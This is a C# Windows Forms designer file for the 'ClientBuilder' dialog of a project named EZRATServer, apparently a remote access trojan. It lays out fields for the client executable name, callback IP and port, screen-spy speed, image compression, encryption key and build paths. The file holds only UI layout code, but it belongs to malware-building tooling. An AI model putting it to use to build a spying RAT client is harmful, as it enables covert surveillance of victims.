namespace EZRATServer.Forms
{
    partial class ClientBuilder
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ClientBuilder));
            this.lblName = new System.Windows.Forms.Label();
            this.tbxName = new System.Windows.Forms.TextBox();
            this.lblIp = new System.Windows.Forms.Label();
            this.tbxIP = new System.Windows.Forms.TextBox();
            this.lblPort = new System.Windows.Forms.Label();
            this.tbxPort = new System.Windows.Forms.TextBox();
            this.btnBuild = new System.Windows.Forms.Button();
            this.lblOptions = new System.Windows.Forms.Label();
            this.lblScreenShotSpeed = new System.Windows.Forms.Label();
            this.lblCompression = new System.Windows.Forms.Label();
            this.lblKey = new System.Windows.Forms.Label();
            this.tbxScreenSpy = new System.Windows.Forms.TextBox();
            this.tbxImageX = new System.Windows.Forms.TextBox();
            this.tbxImageY = new System.Windows.Forms.TextBox();
            this.tbxKey = new System.Windows.Forms.TextBox();
            this.lblBuild = new System.Windows.Forms.Label();
            this.tbxBuild = new System.Windows.Forms.TextBox();
            this.btnSearch = new System.Windows.Forms.Button();
            this.btnSearchingClient = new System.Windows.Forms.Button();
            this.tbxClientProj = new System.Windows.Forms.TextBox();
            this.lblCsproj = new System.Windows.Forms.Label();
            this.SuspendLayout();
            // 
            // lblName
            // 
            this.lblName.AutoSize = true;
            this.lblName.Location = new System.Drawing.Point(12, 20);
            this.lblName.Name = "lblName";
            this.lblName.Size = new System.Drawing.Size(44, 13);
            this.lblName.TabIndex = 0;
            this.lblName.Text = "Name : ";
            // 
            // tbxName
            // 
            this.tbxName.Location = new System.Drawing.Point(53, 17);
            this.tbxName.Name = "tbxName";
            this.tbxName.Size = new System.Drawing.Size(258, 20);
            this.tbxName.TabIndex = 1;
            this.tbxName.Text = "EZRATClient.exe";
            // 
            // lblIp
            // 
            this.lblIp.AutoSize = true;
            this.lblIp.Location = new System.Drawing.Point(18, 53);
            this.lblIp.Name = "lblIp";
            this.lblIp.Size = new System.Drawing.Size(23, 13);
            this.lblIp.TabIndex = 2;
            this.lblIp.Text = "IP :";
            // 
            // tbxIP
            // 
            this.tbxIP.Location = new System.Drawing.Point(53, 49);
            this.tbxIP.Name = "tbxIP";
            this.tbxIP.Size = new System.Drawing.Size(258, 20);
            this.tbxIP.TabIndex = 3;
            // 
            // lblPort
            // 
            this.lblPort.AutoSize = true;
            this.lblPort.Location = new System.Drawing.Point(12, 84);
            this.lblPort.Name = "lblPort";
            this.lblPort.Size = new System.Drawing.Size(35, 13);
            this.lblPort.TabIndex = 4;
            this.lblPort.Text = "Port : ";
            // 
            // tbxPort
            // 
            this.tbxPort.Location = new System.Drawing.Point(53, 81);
            this.tbxPort.Name = "tbxPort";
            this.tbxPort.Size = new System.Drawing.Size(123, 20);
            this.tbxPort.TabIndex = 5;
            this.tbxPort.Text = "1234";
            // 
            // btnBuild
            // 
            this.btnBuild.Location = new System.Drawing.Point(132, 176);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(75, 23);
            this.btnBuild.TabIndex = 6;
            this.btnBuild.Text = "Build";
            this.btnBuild.UseVisualStyleBackColor = true;
            // 
            // lblOptions
            // 
            this.lblOptions.AutoSize = true;
            this.lblOptions.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblOptions.Location = new System.Drawing.Point(3, 194);
            this.lblOptions.Name = "lblOptions";
            this.lblOptions.Size = new System.Drawing.Size(43, 13);
            this.lblOptions.TabIndex = 7;
            this.lblOptions.Text = "Options";
            // 
            // lblScreenShotSpeed
            // 
            this.lblScreenShotSpeed.AutoSize = true;
            this.lblScreenShotSpeed.Location = new System.Drawing.Point(405, 20);
            this.lblScreenShotSpeed.Name = "lblScreenShotSpeed";
            this.lblScreenShotSpeed.Size = new System.Drawing.Size(105, 13);
            this.lblScreenShotSpeed.TabIndex = 8;
            this.lblScreenShotSpeed.Text = "Speed Screen Spy : ";
            // 
            // lblCompression
            // 
            this.lblCompression.AutoSize = true;
            this.lblCompression.Location = new System.Drawing.Point(405, 61);
            this.lblCompression.Name = "lblCompression";
            this.lblCompression.Size = new System.Drawing.Size(107, 13);
            this.lblCompression.TabIndex = 9;
            this.lblCompression.Text = "Image compression : ";
            // 
            // lblKey
            // 
            this.lblKey.AutoSize = true;
            this.lblKey.Location = new System.Drawing.Point(405, 103);
            this.lblKey.Name = "lblKey";
            this.lblKey.Size = new System.Drawing.Size(86, 13);
            this.lblKey.TabIndex = 10;
            this.lblKey.Text = "Key encryption : ";
            // 
            // tbxScreenSpy
            // 
            this.tbxScreenSpy.Location = new System.Drawing.Point(516, 17);
            this.tbxScreenSpy.Name = "tbxScreenSpy";
            this.tbxScreenSpy.Size = new System.Drawing.Size(112, 20);
            this.tbxScreenSpy.TabIndex = 11;
            // 
            // tbxImageX
            // 
            this.tbxImageX.Location = new System.Drawing.Point(516, 58);
            this.tbxImageX.Name = "tbxImageX";
            this.tbxImageX.Size = new System.Drawing.Size(53, 20);
            this.tbxImageX.TabIndex = 12;
            // 
            // tbxImageY
            // 
            this.tbxImageY.Location = new System.Drawing.Point(575, 58);
            this.tbxImageY.Name = "tbxImageY";
            this.tbxImageY.Size = new System.Drawing.Size(53, 20);
            this.tbxImageY.TabIndex = 13;
            // 
            // tbxKey
            // 
            this.tbxKey.Location = new System.Drawing.Point(516, 99);
            this.tbxKey.Name = "tbxKey";
            this.tbxKey.Size = new System.Drawing.Size(112, 20);
            this.tbxKey.TabIndex = 14;
            // 
            // lblBuild
            // 
            this.lblBuild.AutoSize = true;
            this.lblBuild.Location = new System.Drawing.Point(12, 114);
            this.lblBuild.Name = "lblBuild";
            this.lblBuild.Size = new System.Drawing.Size(80, 13);
            this.lblBuild.TabIndex = 15;
            this.lblBuild.Text = "Path MSBuild : ";
            // 
            // tbxBuild
            // 
            this.tbxBuild.Location = new System.Drawing.Point(95, 111);
            this.tbxBuild.Name = "tbxBuild";
            this.tbxBuild.Size = new System.Drawing.Size(216, 20);
            this.tbxBuild.TabIndex = 16;
            this.tbxBuild.Text = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin" +
    "\\MSBuild.exe";
            // 
            // btnSearch
            // 
            this.btnSearch.Location = new System.Drawing.Point(310, 110);
            this.btnSearch.Name = "btnSearch";
            this.btnSearch.Size = new System.Drawing.Size(25, 23);
            this.btnSearch.TabIndex = 17;
            this.btnSearch.Text = "...";
            this.btnSearch.UseVisualStyleBackColor = true;
            // 
            // btnSearchingClient
            // 
            this.btnSearchingClient.Location = new System.Drawing.Point(310, 138);
            this.btnSearchingClient.Name = "btnSearchingClient";
            this.btnSearchingClient.Size = new System.Drawing.Size(25, 23);
            this.btnSearchingClient.TabIndex = 20;
            this.btnSearchingClient.Text = "...";
            this.btnSearchingClient.UseVisualStyleBackColor = true;
            // 
            // tbxClientProj
            // 
            this.tbxClientProj.Location = new System.Drawing.Point(95, 139);
            this.tbxClientProj.Name = "tbxClientProj";
            this.tbxClientProj.Size = new System.Drawing.Size(216, 20);
            this.tbxClientProj.TabIndex = 19;
            this.tbxClientProj.Text = "..\\..\\..\\..\\EZRATClient\\";
            // 
            // lblCsproj
            // 
            this.lblCsproj.AutoSize = true;
            this.lblCsproj.Location = new System.Drawing.Point(10, 142);
            this.lblCsproj.Name = "lblCsproj";
            this.lblCsproj.Size = new System.Drawing.Size(87, 13);
            this.lblCsproj.TabIndex = 18;
            this.lblCsproj.Text = "Path Client proj : ";
            // 
            // ClientBuilder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(657, 211);
            this.Controls.Add(this.btnSearchingClient);
            this.Controls.Add(this.tbxClientProj);
            this.Controls.Add(this.lblCsproj);
            this.Controls.Add(this.btnSearch);
            this.Controls.Add(this.tbxBuild);
            this.Controls.Add(this.lblBuild);
            this.Controls.Add(this.tbxKey);
            this.Controls.Add(this.tbxImageY);
            this.Controls.Add(this.tbxImageX);
            this.Controls.Add(this.tbxScreenSpy);
            this.Controls.Add(this.lblKey);
            this.Controls.Add(this.lblCompression);
            this.Controls.Add(this.lblScreenShotSpeed);
            this.Controls.Add(this.lblOptions);
            this.Controls.Add(this.btnBuild);
            this.Controls.Add(this.tbxPort);
            this.Controls.Add(this.lblPort);
            this.Controls.Add(this.tbxIP);
            this.Controls.Add(this.lblIp);
            this.Controls.Add(this.tbxName);
            this.Controls.Add(this.lblName);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "ClientBuilder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.Text = "ClientBuilder";
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label lblName;
        private System.Windows.Forms.TextBox tbxName;
        private System.Windows.Forms.Label lblIp;
        private System.Windows.Forms.TextBox tbxIP;
        private System.Windows.Forms.Label lblPort;
        private System.Windows.Forms.TextBox tbxPort;
        private System.Windows.Forms.Button btnBuild;
        private System.Windows.Forms.Label lblOptions;
        private System.Windows.Forms.Label lblScreenShotSpeed;
        private System.Windows.Forms.Label lblCompression;
        private System.Windows.Forms.Label lblKey;
        private System.Windows.Forms.TextBox tbxScreenSpy;
        private System.Windows.Forms.TextBox tbxImageX;
        private System.Windows.Forms.TextBox tbxImageY;
        private System.Windows.Forms.TextBox tbxKey;
        private System.Windows.Forms.Label lblBuild;
        private System.Windows.Forms.TextBox tbxBuild;
        private System.Windows.Forms.Button btnSearch;
        private System.Windows.Forms.Button btnSearchingClient;
        private System.Windows.Forms.TextBox tbxClientProj;
        private System.Windows.Forms.Label lblCsproj;
    }
}